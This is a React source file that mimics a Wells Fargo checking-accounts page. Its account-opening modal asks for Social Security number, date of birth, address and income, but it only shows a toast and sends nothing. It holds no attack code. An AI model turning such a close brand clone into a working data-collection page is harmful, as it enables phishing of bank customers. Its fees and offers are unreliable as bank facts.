import { useState, useCallback, useMemo } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Check, ChevronDown, MapPin, Phone, Globe, Menu, Search, Smartphone, ArrowRight, Shield, DollarSign, Zap, CreditCard, X, HelpCircle, Building, Wallet, Clock, Users, CheckCircle2, AlertCircle, ChevronRight } from "lucide-react";
import { Link, useLocation } from "wouter";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";

const checkingAccounts = [
  {
    name: "Everyday Checking",
    monthlyFee: "$10",
    feeWaiver: "Waivable with $500 minimum daily balance, $500+ in qualifying direct deposits, or linked Wells Fargo Campus ATM or Campus Debit Card",
    features: ["Online & Mobile Banking with Zelle®", "Bill Pay & mobile deposit", "Contactless debit card", "Access to 12,000+ ATMs nationwide", "Overdraft protection options", "Early direct deposit up to 2 days"],
    highlight: "Most Popular",
    bonus: "$300 bonus with qualifying direct deposits",
    atmFees: "$2.50 per non-Wells Fargo ATM",
    overdraft: "$35 per item (max 3 per day)",
    minOpenDeposit: "$25",
  },
  {
    name: "Prime Checking",
    monthlyFee: "$25",
    feeWaiver: "Waivable with $20,000 in combined qualifying Wells Fargo deposit, brokerage and loan balances",
    features: ["All Everyday Checking features", "No Wells Fargo ATM fees worldwide", "4 non-Wells Fargo ATM fee rebates/month", "Free standard checks", "Free cashier's checks and money orders", "Preferred relationship rates on loans"],
    highlight: "Premium",
    bonus: null,
    atmFees: "Free (includes 4 rebates/month for non-WF ATMs)",
    overdraft: "$35 per item (max 3 per day)",
    minOpenDeposit: "$25",
  },
  {
    name: "Clear Access Banking℠",
    monthlyFee: "$5",
    feeWaiver: "Primary account holder is 13-24 years old",
    features: ["No overdraft fees ever", "No non-sufficient funds (NSF) fees", "Early direct deposit up to 2 days", "Mobile & Online Banking", "Contactless debit card", "Free money orders"],
    highlight: "No Overdraft Fees",
    bonus: null,
    atmFees: "$2.50 per non-Wells Fargo ATM",
    overdraft: "No overdraft fees",
    minOpenDeposit: "$25",
  },
];

const faqs = [
  { q: "What do I need to open a checking account?", a: "You'll need a valid government-issued photo ID (driver's license, state ID, or passport), your Social Security number, and a minimum opening deposit of $25. You can open an account online, by phone, or at any Wells Fargo branch." },
  { q: "How do I avoid the monthly service fee?", a: "Each account has different ways to waive the fee. For Everyday Checking, maintain a $500 minimum daily balance or receive $500+ in qualifying direct deposits. For Prime Checking, maintain $20,000 in combined qualifying balances." },
  { q: "How long does it take for direct deposit to show up?", a: "With Early Pay Day, you can receive your paycheck up to 2 days early when you set up direct deposit. Timing depends on when your employer submits the payment." },
  { q: "Can I link my checking account to Zelle®?", a: "Yes, Zelle® is available through Wells Fargo Online® and the Wells Fargo Mobile® app. You can send money to almost anyone with a U.S. bank account using just their email or mobile number." },
  { q: "What overdraft protection options are available?", a: "We offer Overdraft Protection that links your checking to a savings account, credit card, or line of credit. You can also opt out of Debit Card Overdraft Service to have transactions declined instead of incurring fees." },
];

export default function CheckingPage() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [searchQuery, setSearchQuery] = useState("");
  const [showApplicationModal, setShowApplicationModal] = useState(false);
  const [showCompareModal, setShowCompareModal] = useState(false);
  const [selectedAccount, setSelectedAccount] = useState("");
  const [applicationStep, setApplicationStep] = useState(1);
  const [accountType, setAccountType] = useState("individual");
  const [formData, setFormData] = useState({
    firstName: "", lastName: "", middleName: "", suffix: "",
    email: "", phone: "", altPhone: "",
    ssn: "", dateOfBirth: "", citizenship: "us",
    address: "", apt: "", city: "", state: "", zip: "",
    mailingDifferent: false, mailingAddress: "", mailingCity: "", mailingState: "", mailingZip: "",
    employmentStatus: "", employer: "", occupation: "", annualIncome: "",
    initialDeposit: "", fundingSource: "transfer",
  });

  const handleSearch = useCallback((e: React.FormEvent) => {
    e.preventDefault();
    if (searchQuery.trim()) {
      toast({ title: "Search Results", description: `Showing results for "${searchQuery}"` });
    }
  }, [searchQuery, toast]);

  const handleOpenAccount = useCallback((accountName: string) => {
    setSelectedAccount(accountName);
    setApplicationStep(1);
    setShowApplicationModal(true);
  }, []);

  const handleApplicationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (applicationStep < 4) {
      setApplicationStep(applicationStep + 1);
    } else {
      setShowApplicationModal(false);
      toast({
        title: "Application Submitted Successfully!",
        description: `Your ${selectedAccount} application has been received. Application #WF${Date.now().toString().slice(-8)}. You'll receive a confirmation email within 24 hours.`,
      });
      setFormData({
        firstName: "", lastName: "", middleName: "", suffix: "",
        email: "", phone: "", altPhone: "",
        ssn: "", dateOfBirth: "", citizenship: "us",
        address: "", apt: "", city: "", state: "", zip: "",
        mailingDifferent: false, mailingAddress: "", mailingCity: "", mailingState: "", mailingZip: "",
        employmentStatus: "", employer: "", occupation: "", annualIncome: "",
        initialDeposit: "", fundingSource: "transfer",
      });
      setApplicationStep(1);
    }
  };

  const stepTitles = ["Account Type", "Personal Information", "Employment & Income", "Review & Fund"];

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]">
      {/* Application Modal */}
      <Dialog open={showApplicationModal} onOpenChange={setShowApplicationModal}>
        <DialogContent className="sm:max-w-[600px] max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="text-[#d71e28]">Open {selectedAccount}</DialogTitle>
            <DialogDescription>Step {applicationStep} of 4: {stepTitles[applicationStep - 1]}</DialogDescription>
          </DialogHeader>
          <div className="flex gap-1 mb-4">
            {[1,2,3,4].map(step => (
              <div key={step} className={`h-1 flex-1 rounded ${step <= applicationStep ? 'bg-[#d71e28]' : 'bg-gray-200'}`} />
            ))}
          </div>
          <form onSubmit={handleApplicationSubmit} className="space-y-4">
            {applicationStep === 1 && (
              <>
                <div>
                  <Label className="text-base font-semibold">Account Ownership Type</Label>
                  <RadioGroup value={accountType} onValueChange={setAccountType} className="mt-2">
                    <div className="flex items-center space-x-2 p-3 border rounded-lg hover:bg-gray-50">
                      <RadioGroupItem value="individual" id="individual" />
                      <Label htmlFor="individual" className="flex-1 cursor-pointer">
                        <span className="font-medium">Individual Account</span>
                        <p className="text-sm text-gray-500">Single owner with full access</p>
                      </Label>
                    </div>
                    <div className="flex items-center space-x-2 p-3 border rounded-lg hover:bg-gray-50">
                      <RadioGroupItem value="joint" id="joint" />
                      <Label htmlFor="joint" className="flex-1 cursor-pointer">
                        <span className="font-medium">Joint Account</span>
                        <p className="text-sm text-gray-500">Two or more owners with equal access</p>
                      </Label>
                    </div>
                  </RadioGroup>
                </div>
                <div className="bg-blue-50 p-4 rounded-lg">
                  <h4 className="font-semibold text-blue-800 flex items-center gap-2"><CheckCircle2 className="w-4 h-4" /> What you'll need</h4>
                  <ul className="text-sm text-blue-700 mt-2 space-y-1">
                    <li>• Valid government-issued photo ID</li>
                    <li>• Social Security Number or ITIN</li>
                    <li>• Current residential address</li>
                    <li>• Employment information</li>
                    <li>• Initial deposit of $25 or more</li>
                  </ul>
                </div>
              </>
            )}
            {applicationStep === 2 && (
              <>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>First Name *</Label><Input value={formData.firstName} onChange={(e) => setFormData({...formData, firstName: e.target.value})} required /></div>
                  <div><Label>Last Name *</Label><Input value={formData.lastName} onChange={(e) => setFormData({...formData, lastName: e.target.value})} required /></div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>Middle Name</Label><Input value={formData.middleName} onChange={(e) => setFormData({...formData, middleName: e.target.value})} /></div>
                  <div><Label>Suffix</Label>
                    <Select value={formData.suffix} onValueChange={(v) => setFormData({...formData, suffix: v})}>
                      <SelectTrigger><SelectValue placeholder="Select" /></SelectTrigger>
                      <SelectContent>
                        <SelectItem value="none">None</SelectItem>
                        <SelectItem value="jr">Jr.</SelectItem>
                        <SelectItem value="sr">Sr.</SelectItem>
                        <SelectItem value="ii">II</SelectItem>
                        <SelectItem value="iii">III</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>Date of Birth *</Label><Input type="date" value={formData.dateOfBirth} onChange={(e) => setFormData({...formData, dateOfBirth: e.target.value})} required /></div>
                  <div><Label>Social Security Number *</Label><Input type="password" placeholder="XXX-XX-XXXX" value={formData.ssn} onChange={(e) => setFormData({...formData, ssn: e.target.value})} required /></div>
                </div>
                <div><Label>Email Address *</Label><Input type="email" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} required /></div>
                <div className="grid grid-cols-2 gap-4">
                  <div><Label>Mobile Phone *</Label><Input type="tel" value={formData.phone} onChange={(e) => setFormData({...formData, phone: e.target.value})} required /></div>
                  <div><Label>Alternate Phone</Label><Input type="tel" value={formData.altPhone} onChange={(e) => setFormData({...formData, altPhone: e.target.value})} /></div>
                </div>
                <div><Label>Street Address *</Label><Input value={formData.address} onChange={(e) => setFormData({...formData, address: e.target.value})} required /></div>
                <div className="grid grid-cols-4 gap-4">
                  <div><Label>Apt/Suite</Label><Input value={formData.apt} onChange={(e) => setFormData({...formData, apt: e.target.value})} /></div>
                  <div><Label>City *</Label><Input value={formData.city} onChange={(e) => setFormData({...formData, city: e.target.value})} required /></div>
                  <div><Label>State *</Label><Input value={formData.state} onChange={(e) => setFormData({...formData, state: e.target.value})} required maxLength={2} /></div>
                  <div><Label>ZIP *</Label><Input value={formData.zip} onChange={(e) => setFormData({...formData, zip: e.target.value})} required maxLength={5} /></div>
                </div>
              </>
            )}
            {applicationStep === 3 && (
              <>
                <div>
                  <Label>Employment Status *</Label>
                  <Select value={formData.employmentStatus} onValueChange={(v) => setFormData({...formData, employmentStatus: v})}>
                    <SelectTrigger><SelectValue placeholder="Select employment status" /></SelectTrigger>
                    <SelectContent>
                      <SelectItem value="employed">Employed</SelectItem>
                      <SelectItem value="self-employed">Self-Employed</SelectItem>
                      <SelectItem value="retired">Retired</SelectItem>
                      <SelectItem value="student">Student</SelectItem>
                      <SelectItem value="homemaker">Homemaker</SelectItem>
                      <SelectItem value="unemployed">Not Currently Employed</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                {(formData.employmentStatus === "employed" || formData.employmentStatus === "self-employed") && (
                  <>
                    <div><Label>Employer/Business Name</Label><Input value={formData.employer} onChange={(e) => setFormData({...formData, employer: e.target.value})} /></div>
                    <div><Label>Occupation/Title</Label><Input value={formData.occupation} onChange={(e) => setFormData({...formData, occupation: e.target.value})} /></div>
                  </>
                )}
                <div>
                  <Label>Annual Household Income *</Label>
                  <Select value={formData.annualIncome} onValueChange={(v) => setFormData({...formData, annualIncome: v})}>
                    <SelectTrigger><SelectValue placeholder="Select income range" /></SelectTrigger>
                    <SelectContent>
                      <SelectItem value="under25k">Under $25,000</SelectItem>
                      <SelectItem value="25k-50k">$25,000 - $49,999</SelectItem>
                      <SelectItem value="50k-75k">$50,000 - $74,999</SelectItem>
                      <SelectItem value="75k-100k">$75,000 - $99,999</SelectItem>
                      <SelectItem value="100k-150k">$100,000 - $149,999</SelectItem>
                      <SelectItem value="150k-250k">$150,000 - $249,999</SelectItem>
                      <SelectItem value="250k+">$250,000 or more</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg">
                  <p className="text-sm text-yellow-800"><AlertCircle className="w-4 h-4 inline mr-1" />This information is required by federal law to verify your identity and help prevent fraud.</p>
                </div>
              </>
            )}
            {applicationStep === 4 && (
              <>
                <div className="bg-gray-50 p-4 rounded-lg space-y-3">
                  <h4 className="font-semibold border-b pb-2">Application Summary</h4>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <span className="text-gray-600">Account Type:</span><span className="font-medium">{selectedAccount}</span>
                    <span className="text-gray-600">Ownership:</span><span className="font-medium capitalize">{accountType}</span>
                    <span className="text-gray-600">Name:</span><span className="font-medium">{formData.firstName} {formData.lastName}</span>
                    <span className="text-gray-600">Email:</span><span className="font-medium">{formData.email}</span>
                    <span className="text-gray-600">Phone:</span><span className="font-medium">{formData.phone}</span>
                    <span className="text-gray-600">Address:</span><span className="font-medium">{formData.address}, {formData.city}, {formData.state} {formData.zip}</span>
                  </div>
                </div>
                <div>
                  <Label>Initial Deposit Amount *</Label>
                  <Input type="number" min="25" placeholder="Minimum $25.00" value={formData.initialDeposit} onChange={(e) => setFormData({...formData, initialDeposit: e.target.value})} required />
                </div>
                <div>
                  <Label>Funding Source</Label>
                  <Select value={formData.fundingSource} onValueChange={(v) => setFormData({...formData, fundingSource: v})}>
                    <SelectTrigger><SelectValue /></SelectTrigger>
                    <SelectContent>
                      <SelectItem value="transfer">Transfer from another bank</SelectItem>
                      <SelectItem value="wf-account">Transfer from Wells Fargo account</SelectItem>
                      <SelectItem value="debit">Debit card</SelectItem>
                      <SelectItem value="mail">Mail a check</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="text-xs text-gray-500 space-y-2 border-t pt-4">
                  <p>By clicking Submit, I certify that the information I have provided is true and complete. I agree to the Wells Fargo Deposit Account Agreement and authorize Wells Fargo to verify my information.</p>
                </div>
              </>
            )}
            <div className="flex gap-3 justify-between pt-4 border-t">
              {applicationStep > 1 ? (
                <Button type="button" variant="outline" onClick={() => setApplicationStep(applicationStep - 1)}>Back</Button>
              ) : <div />}
              <Button type="submit" className="bg-[#d71e28] hover:bg-[#b91c23]">{applicationStep === 4 ? "Submit Application" : "Continue"}</Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>

      {/* Compare Modal */}
      <Dialog open={showCompareModal} onOpenChange={setShowCompareModal}>
        <DialogContent className="sm:max-w-[900px] max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Compare Checking Accounts</DialogTitle>
          </DialogHeader>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b">
                  <th className="text-left p-3 bg-gray-50">Feature</th>
                  {checkingAccounts.map(acc => (
                    <th key={acc.name} className="text-center p-3 bg-gray-50 min-w-[180px]">
                      <div className="font-bold text-[#d71e28]">{acc.name}</div>
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                <tr className="border-b"><td className="p-3 font-medium">Monthly Fee</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3">{acc.monthlyFee}</td>)}</tr>
                <tr className="border-b bg-gray-50"><td className="p-3 font-medium">Min. Opening Deposit</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3">{acc.minOpenDeposit}</td>)}</tr>
                <tr className="border-b"><td className="p-3 font-medium">Overdraft Fee</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3">{acc.overdraft}</td>)}</tr>
                <tr className="border-b bg-gray-50"><td className="p-3 font-medium">Non-WF ATM Fee</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3">{acc.atmFees}</td>)}</tr>
                <tr className="border-b"><td className="p-3 font-medium">Early Direct Deposit</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3"><Check className="w-5 h-5 text-green-600 mx-auto" /></td>)}</tr>
                <tr className="border-b bg-gray-50"><td className="p-3 font-medium">Mobile Deposit</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3"><Check className="w-5 h-5 text-green-600 mx-auto" /></td>)}</tr>
                <tr className="border-b"><td className="p-3 font-medium">Zelle®</td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3"><Check className="w-5 h-5 text-green-600 mx-auto" /></td>)}</tr>
                <tr><td className="p-3"></td>{checkingAccounts.map(acc => <td key={acc.name} className="text-center p-3"><Button onClick={() => { setShowCompareModal(false); handleOpenAccount(acc.name); }} className="bg-[#d71e28] hover:bg-[#b91c23] text-sm">Open Account</Button></td>)}</tr>
              </tbody>
            </table>
          </div>
        </DialogContent>
      </Dialog>

      {/* Top utility bar */}
      <div className="bg-[#2c2c2c] text-white text-xs">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between py-2">
            <div className="flex items-center gap-5">
              <button onClick={() => toast({ title: "Find Locations", description: "Over 4,700 branches and 12,000+ ATMs nationwide. Use our locator to find the nearest one." })} className="hover:underline flex items-center gap-1.5 text-gray-300 hover:text-white transition-colors"><MapPin className="w-3.5 h-3.5" /><span>Find Locations</span></button>
              <button onClick={() => toast({ title: "Customer Service", description: "Personal Banking: 1-800-869-3557 (24/7)\nSmall Business: 1-800-225-5935\nEspañol: 1-877-727-2932" })} className="hover:underline flex items-center gap-1.5 text-gray-300 hover:text-white transition-colors"><Phone className="w-3.5 h-3.5" /><span>1-800-869-3557</span></button>
            </div>
            <div className="flex items-center gap-5">
              <button onClick={() => toast({ title: "Schedule Appointment", description: "Book a meeting with a banker at your local branch." })} className="hover:underline text-gray-300 hover:text-white transition-colors">Schedule Appointment</button>
              <button onClick={() => toast({ title: "Idioma", description: "Sitio en español próximamente" })} className="hover:underline flex items-center gap-1.5 text-gray-300 hover:text-white transition-colors"><Globe className="w-3.5 h-3.5" /><span>Español</span></button>
            </div>
          </div>
        </div>
      </div>

      {/* Main header */}
      <header className="bg-[#d71e28]">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between py-3">
            <Link href="/"><span className="text-white text-2xl sm:text-3xl tracking-wide cursor-pointer" style={{ fontFamily: "'Times New Roman', 'Georgia', serif", fontWeight: 400 }}>WELLS FARGO</span></Link>
            <div className="flex items-center gap-4">
              <form onSubmit={handleSearch} className="relative hidden lg:block">
                <Input placeholder="Search" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} className="w-56 h-9 bg-white border-0 text-gray-800 placeholder:text-gray-500 text-sm rounded-sm pr-10" />
                <button type="submit" className="absolute right-0 top-0 h-full px-3 bg-[#b91c23] hover:bg-[#a01820] transition-colors rounded-r-sm"><Search className="w-4 h-4 text-white" /></button>
              </form>
              <button className="lg:hidden text-white p-2"><Menu className="w-5 h-5" /></button>
            </div>
          </div>
        </div>

        <nav className="bg-[#c41e24] border-t border-[#b91c23]">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center overflow-x-auto">
              {[{ name: "Personal", href: "/", active: true }, { name: "Small Business", href: "#" }, { name: "Commercial", href: "#" }, { name: "Corporate & Investment", href: "#" }].map((item) => (
                <Link key={item.name} href={item.href}>
                  <span className={`px-5 py-3.5 text-sm text-white whitespace-nowrap flex items-center gap-1.5 cursor-pointer transition-colors ${item.active ? "bg-[#a01820] border-b-[3px] border-[#ffcd41]" : "hover:bg-[#b91c23] border-b-[3px] border-transparent"}`}>{item.name}<ChevronDown className="w-3 h-3 opacity-70" /></span>
                </Link>
              ))}
            </div>
          </div>
        </nav>

        <div className="bg-[#a01820]">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex items-center gap-8 py-2.5 overflow-x-auto">
              {[
                { name: "Checking", href: "/checking", active: true },
                { name: "Savings & CDs", href: "/savings" },
                { name: "Credit Cards", href: "/credit-cards" },
                { name: "Home Loans", href: "/home-loans" },
                { name: "Auto", href: "/auto" },
                { name: "Investing", href: "/investing" },
              ].map((item) => (
                <Link key={item.name} href={item.href}><span className={`text-sm whitespace-nowrap transition-colors cursor-pointer ${item.active ? "text-white font-semibold" : "text-white/80 hover:text-white"}`}>{item.name}</span></Link>
              ))}
            </div>
          </div>
        </div>
      </header>

      <div className="bg-[#ffcd41] h-2"></div>

      {/* Hero Section */}
      <section className="bg-gradient-to-r from-[#d71e28] to-[#8a1419] text-white py-16">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid lg:grid-cols-2 gap-8 items-center">
            <div>
              <p className="text-white/80 text-sm mb-2">CHECKING ACCOUNTS</p>
              <h1 className="text-4xl lg:text-5xl font-bold mb-4">Bank smarter with a Wells Fargo checking account</h1>
              <p className="text-xl text-white/90 mb-6">Convenient access to your money with tools to help you manage your finances and reach your goals.</p>
              <div className="flex gap-4 flex-wrap">
                <Button onClick={() => handleOpenAccount("Everyday Checking")} className="bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full px-8 py-6 text-lg">Open an Account</Button>
                <Button onClick={() => setShowCompareModal(true)} variant="outline" className="border-2 border-white text-white hover:bg-white/10 rounded-full px-8 py-6 text-lg">Compare Accounts</Button>
              </div>
            </div>
            <div className="hidden lg:block">
              <Card className="bg-white/10 backdrop-blur border-white/20">
                <CardContent className="p-6">
                  <h3 className="font-semibold text-lg mb-4 flex items-center gap-2"><DollarSign className="w-5 h-5" /> Limited Time Offer</h3>
                  <p className="text-3xl font-bold mb-2">Earn $300</p>
                  <p className="text-white/90 mb-4">Open a new Everyday Checking account with qualifying direct deposits totaling $1,000 or more within 90 days of account opening.</p>
                  <Button onClick={() => handleOpenAccount("Everyday Checking")} className="w-full bg-white text-[#d71e28] hover:bg-gray-100 font-semibold">Claim Your Bonus</Button>
                  <p className="text-xs text-white/60 mt-3">Offer expires 03/31/2026. Terms apply.</p>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </section>

      {/* Quick Links */}
      <section className="bg-white border-b">
        <div className="max-w-6xl mx-auto px-4 py-4">
          <div className="flex items-center justify-center gap-8 flex-wrap text-sm">
            {[
              { icon: Building, label: "Find a Branch", action: () => toast({ title: "Branch Locator", description: "Find your nearest Wells Fargo branch or ATM." }) },
              { icon: Smartphone, label: "Mobile Banking", action: () => toast({ title: "Mobile App", description: "Download the Wells Fargo Mobile app for iOS or Android." }) },
              { icon: Shield, label: "Security Center", action: () => toast({ title: "Security", description: "Learn about our fraud protection and security features." }) },
              { icon: HelpCircle, label: "Help & FAQs", action: () => document.getElementById('faqs')?.scrollIntoView({ behavior: 'smooth' }) },
            ].map((item) => (
              <button key={item.label} onClick={item.action} className="flex items-center gap-2 text-[#d71e28] hover:underline"><item.icon className="w-4 h-4" />{item.label}</button>
            ))}
          </div>
        </div>
      </section>

      {/* Main Content */}
      <main className="flex-1 py-12">
        <div className="max-w-6xl mx-auto px-4">
          {/* Account Cards */}
          <h2 className="text-2xl font-bold text-gray-800 mb-2">Choose Your Checking Account</h2>
          <p className="text-gray-600 mb-8">Find the right account based on your needs. All accounts include mobile banking, online bill pay, and 24/7 customer support.</p>
          
          <div className="grid lg:grid-cols-3 gap-6 mb-12">
            {checkingAccounts.map((account) => (
              <Card key={account.name} className="border-0 shadow-lg hover:shadow-xl transition-all relative overflow-hidden group">
                {account.highlight && (
                  <div className="absolute top-0 left-0 right-0 bg-[#d71e28] text-white text-xs font-semibold py-1.5 text-center">{account.highlight}</div>
                )}
                <CardContent className={`p-6 ${account.highlight ? "pt-10" : ""}`}>
                  <h3 className="text-xl font-bold text-gray-800 mb-2">{account.name}</h3>
                  <div className="mb-4">
                    <span className="text-3xl font-bold text-[#d71e28]">{account.monthlyFee}</span>
                    <span className="text-gray-500 text-sm"> /month</span>
                  </div>
                  <p className="text-sm text-gray-600 mb-4 min-h-[60px]">{account.feeWaiver}</p>
                  {account.bonus && (
                    <div className="bg-[#fff8e6] rounded-lg p-3 mb-4 border border-[#ffcd41]">
                      <p className="text-sm font-medium text-[#8b6914]">{account.bonus}</p>
                    </div>
                  )}
                  <ul className="space-y-2 mb-6">
                    {account.features.slice(0, 5).map((feature, i) => (
                      <li key={i} className="flex items-start gap-2 text-sm text-gray-700"><Check className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />{feature}</li>
                    ))}
                  </ul>
                  <Button onClick={() => handleOpenAccount(account.name)} className="w-full bg-[#d71e28] hover:bg-[#b91c23] text-white rounded-full mb-2">Open Account</Button>
                  <button onClick={() => toast({ title: account.name, description: `Learn more about ${account.name} features and benefits.` })} className="w-full text-center text-sm text-[#d71e28] hover:underline">Learn more <ChevronRight className="w-3 h-3 inline" /></button>
                </CardContent>
              </Card>
            ))}
          </div>

          {/* Features Tabs */}
          <div className="mb-12">
            <Tabs defaultValue="mobile" className="w-full">
              <TabsList className="grid w-full grid-cols-4 mb-6">
                <TabsTrigger value="mobile">Mobile Banking</TabsTrigger>
                <TabsTrigger value="security">Security</TabsTrigger>
                <TabsTrigger value="overdraft">Overdraft Options</TabsTrigger>
                <TabsTrigger value="rewards">Rewards</TabsTrigger>
              </TabsList>
              <TabsContent value="mobile">
                <Card className="border-0 shadow-md">
                  <CardContent className="p-6">
                    <div className="grid md:grid-cols-2 gap-6">
                      <div>
                        <h3 className="text-xl font-bold mb-4">Bank on the go with our award-winning app</h3>
                        <ul className="space-y-3">
                          <li className="flex items-start gap-3"><Smartphone className="w-5 h-5 text-[#d71e28] mt-1" /><div><strong>Mobile Deposit</strong><p className="text-sm text-gray-600">Deposit checks anytime by taking a photo with your phone</p></div></li>
                          <li className="flex items-start gap-3"><Zap className="w-5 h-5 text-[#d71e28] mt-1" /><div><strong>Zelle®</strong><p className="text-sm text-gray-600">Send money in minutes to friends and family</p></div></li>
                          <li className="flex items-start gap-3"><Wallet className="w-5 h-5 text-[#d71e28] mt-1" /><div><strong>Digital Wallets</strong><p className="text-sm text-gray-600">Add your card to Apple Pay®, Google Pay™, or Samsung Pay</p></div></li>
                          <li className="flex items-start gap-3"><Clock className="w-5 h-5 text-[#d71e28] mt-1" /><div><strong>24/7 Access</strong><p className="text-sm text-gray-600">Check balances, pay bills, and transfer money anytime</p></div></li>
                        </ul>
                      </div>
                      <div className="bg-gray-100 rounded-lg p-6 text-center">
                        <Smartphone className="w-16 h-16 text-[#d71e28] mx-auto mb-4" />
                        <h4 className="font-semibold mb-2">Download the App</h4>
                        <p className="text-sm text-gray-600 mb-4">Available on iOS and Android</p>
                        <div className="flex gap-2 justify-center">
                          <Button onClick={() => toast({ title: "App Store", description: "Redirecting to the App Store..." })} variant="outline" size="sm">App Store</Button>
                          <Button onClick={() => toast({ title: "Google Play", description: "Redirecting to Google Play..." })} variant="outline" size="sm">Google Play</Button>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              <TabsContent value="security">
                <Card className="border-0 shadow-md">
                  <CardContent className="p-6">
                    <h3 className="text-xl font-bold mb-4">Your security is our priority</h3>
                    <div className="grid md:grid-cols-3 gap-4">
                      {[
                        { icon: Shield, title: "Zero Liability Protection", desc: "You're not responsible for unauthorized transactions when reported promptly" },
                        { icon: AlertCircle, title: "Real-Time Alerts", desc: "Get instant notifications for purchases, deposits, and suspicious activity" },
                        { icon: CreditCard, title: "Card Controls", desc: "Turn your debit card on/off instantly from the mobile app" },
                      ].map((item) => (
                        <div key={item.title} className="p-4 bg-gray-50 rounded-lg">
                          <item.icon className="w-8 h-8 text-[#d71e28] mb-3" />
                          <h4 className="font-semibold mb-2">{item.title}</h4>
                          <p className="text-sm text-gray-600">{item.desc}</p>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              <TabsContent value="overdraft">
                <Card className="border-0 shadow-md">
                  <CardContent className="p-6">
                    <h3 className="text-xl font-bold mb-4">Overdraft protection options</h3>
                    <div className="space-y-4">
                      <div className="p-4 border rounded-lg">
                        <h4 className="font-semibold">Link to Savings</h4>
                        <p className="text-sm text-gray-600">Automatically transfer funds from your savings account to cover overdrafts. $12.50 transfer fee.</p>
                      </div>
                      <div className="p-4 border rounded-lg">
                        <h4 className="font-semibold">Link to Credit Card</h4>
                        <p className="text-sm text-gray-600">Use your Wells Fargo credit card as a backup. Cash advance fees and interest apply.</p>
                      </div>
                      <div className="p-4 border rounded-lg">
                        <h4 className="font-semibold">Overdraft Protection Line of Credit</h4>
                        <p className="text-sm text-gray-600">Access a line of credit to cover overdrafts. Interest charges apply, no transfer fee.</p>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              <TabsContent value="rewards">
                <Card className="border-0 shadow-md">
                  <CardContent className="p-6">
                    <h3 className="text-xl font-bold mb-4">Earn rewards with your checking account</h3>
                    <p className="text-gray-600 mb-4">Link your checking to a Wells Fargo credit card and earn bonus rewards on everyday purchases.</p>
                    <Button onClick={() => toast({ title: "Rewards Program", description: "Learn more about earning rewards with your Wells Fargo accounts." })} className="bg-[#d71e28] hover:bg-[#b91c23]">Explore Credit Cards</Button>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>

          {/* FAQs */}
          <div id="faqs" className="mb-12">
            <h2 className="text-2xl font-bold text-gray-800 mb-6">Frequently Asked Questions</h2>
            <Accordion type="single" collapsible className="w-full">
              {faqs.map((faq, i) => (
                <AccordionItem key={i} value={`item-${i}`}>
                  <AccordionTrigger className="text-left">{faq.q}</AccordionTrigger>
                  <AccordionContent className="text-gray-600">{faq.a}</AccordionContent>
                </AccordionItem>
              ))}
            </Accordion>
          </div>

          {/* CTA */}
          <Card className="bg-gradient-to-r from-[#d71e28] to-[#8a1419] text-white border-0">
            <CardContent className="p-8 text-center">
              <h2 className="text-2xl font-bold mb-4">Ready to open your account?</h2>
              <p className="text-white/90 mb-6 max-w-2xl mx-auto">Join millions of customers who trust Wells Fargo for their everyday banking needs. Open your account online in minutes.</p>
              <div className="flex gap-4 justify-center flex-wrap">
                <Button onClick={() => handleOpenAccount("Everyday Checking")} className="bg-[#ffcd41] hover:bg-[#edc13b] text-gray-900 font-semibold rounded-full px-8">Open Account Online</Button>
                <Button onClick={() => toast({ title: "Schedule Appointment", description: "Book a meeting at your local branch." })} variant="outline" className="border-2 border-white text-white hover:bg-white/10 rounded-full px-8">Visit a Branch</Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      {/* Footer */}
